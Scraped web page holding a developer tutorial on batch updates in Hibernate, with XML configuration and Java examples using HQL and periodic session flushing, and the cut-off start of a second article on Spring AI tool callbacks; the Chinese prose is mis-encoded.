data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ54ï¼‰Hibernateä¸­çš„æ‰¹é‡æ›´æ–°å¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T11:55:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ54ï¼‰Hibernateä¸­çš„æ‰¹é‡æ›´æ–°å¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:47.000Z" title="Tue Jan 20 2026 11:55:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Hibernateä¸­ï¼Œæ‰¹é‡æ›´æ–°å¯ä»¥æ˜¾è‘—æé«˜æ›´æ–°æ“ä½œçš„æ€§èƒ½ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶ã€‚æ‰¹é‡æ›´æ–°å¯ä»¥é€šè¿‡ä½¿ç”¨HQLï¼ˆHibernate Query Languageï¼‰å®ç°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¯ç”¨Hibernateçš„æ‰¹é‡æ“ä½œè®¾ç½®æ¥ä¼˜åŒ–æ€§èƒ½ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„æ‰¹é‡æ›´æ–°å®ç°å’Œä»£ç ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-0">1. ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡æ›´æ–°</h3>
<p>é€šè¿‡HQLè¯­å¥å¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡æ›´æ–°æ“ä½œï¼Œè€Œæ— éœ€é€æ¡æ›´æ–°å®ä½“ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>é¦–å…ˆï¼Œç¡®ä¿åœ¨<code>hibernate.cfg.xml</code>ä¸­æ­£ç¡®é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡æ›´æ–°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchUpdateExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        updateProductPrices(<span class="hljs-number">10.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProductPrices</span><span class="hljs-params">(<span class="hljs-type">double</span> increaseAmount)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"update Product set price = price + :increaseAmount"</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">updatedEntities</span> <span class="hljs-operator">=</span> session.createQuery(hql)
                                         .setParameter(<span class="hljs-string">"increaseAmount"</span>, increaseAmount)
                                         .executeUpdate();
            transaction.commit();
            System.out.println(<span class="hljs-string">"Number of products updated: "</span> + updatedEntities);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®è¿›è¡Œä¼˜åŒ–</h3>
<p>Hibernateå…è®¸é€šè¿‡æ‰¹é‡æ“ä½œè®¾ç½®æ¥ä¼˜åŒ–æ‰¹é‡æ›´æ–°æ€§èƒ½ã€‚åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®æ‰¹é‡æ“ä½œå±æ€§ï¼š</p>
<h4 data-id="heading-5">é…ç½®æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- other configurations --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.jdbc.batch_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_inserts"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_updates"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">æ‰¹é‡æ›´æ–°ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchInsertExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchInsertProducts();
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchInsertProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++) {
                <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
                product.setName(<span class="hljs-string">"Product "</span> + i);
                product.setPrice(<span class="hljs-number">100.0</span> + i);
                session.save(product);

                <span class="hljs-comment">// æ¯æ‰¹æ¬¡20ä¸ªè¿›è¡Œä¸€æ¬¡æ‰¹å¤„ç†</span>
                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products inserted successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h4 data-id="heading-7">æ‰¹é‡æ›´æ–°ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchUpdateExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchUpdateProductPrices(<span class="hljs-number">10.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchUpdateProductPrices</span><span class="hljs-params">(<span class="hljs-type">double</span> increaseAmount)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            List&lt;Product&gt; products = session.createQuery(<span class="hljs-string">"from Product"</span>, Product.class).list();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Product product : products) {
                product.setPrice(product.getPrice() + increaseAmount);
                session.update(product);

                <span class="hljs-comment">// æ¯æ‰¹æ¬¡20ä¸ªè¿›è¡Œä¸€æ¬¡æ‰¹å¤„ç†</span>
                <span class="hljs-keyword">if</span> (++count % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">æ€»ç»“</h3>
<ol>
<li><strong>ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡æ›´æ–°</strong>ï¼šé€šè¿‡HQLè¯­å¥å¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡æ›´æ–°æ“ä½œï¼Œé¿å…é€æ¡æ›´æ–°å®ä½“ã€‚</li>
<li><strong>é…ç½®Hibernateæ‰¹é‡æ“ä½œè®¾ç½®</strong>ï¼šé€šè¿‡åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®<code>hibernate.jdbc.batch_size</code>ç­‰å±æ€§ï¼Œå¯ä»¥ä¼˜åŒ–æ‰¹é‡æ›´æ–°çš„æ€§èƒ½ã€‚</li>
<li><strong>æ‰¹é‡æ“ä½œç¤ºä¾‹</strong>ï¼šé€šè¿‡ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®å’Œå®šæœŸåˆ·æ–°æ¸…ç†ä¼šè¯ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†å¤§æ‰¹é‡çš„æ•°æ®æ›´æ–°ã€‚</li>
</ol>
<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œå¯ä»¥æ˜¾è‘—æé«˜Hibernateåº”ç”¨ç¨‹åºçš„æ‰¹é‡æ›´æ–°æ€§èƒ½ã€‚å¸Œæœ›è¿™äº›è¯¦ç»†çš„è§£é‡Šå’Œä»£ç ç¤ºä¾‹èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨Hibernateçš„æ‰¹é‡æ›´æ–°æŠ€æœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring AI å·¥å…·è°ƒç”¨å›è°ƒä¸æµå¼å‰ç«¯å±•ç¤ºçš„å®Œæ•´è½åœ°æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7597199288817762344</link>    <guid>https://juejin.cn/post/7597199288817762344</guid>    <pubDate>2026-01-20T09:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597199288817762344" data-draft-id="7597259271109869608" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI å·¥å…·è°ƒç”¨å›è°ƒä¸æµå¼å‰ç«¯å±•ç¤ºçš„å®Œæ•´è½åœ°æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-20T09:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leikooo"/> <meta itemprop="url" content="https://juejin.cn/user/2441356474071421"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI å·¥å…·è°ƒç”¨å›è°ƒä¸æµå¼å‰ç«¯å±•ç¤ºçš„å®Œæ•´è½åœ°æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441356474071421/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leikooo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:38:50.000Z" title="Tue Jan 20 2026 09:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body 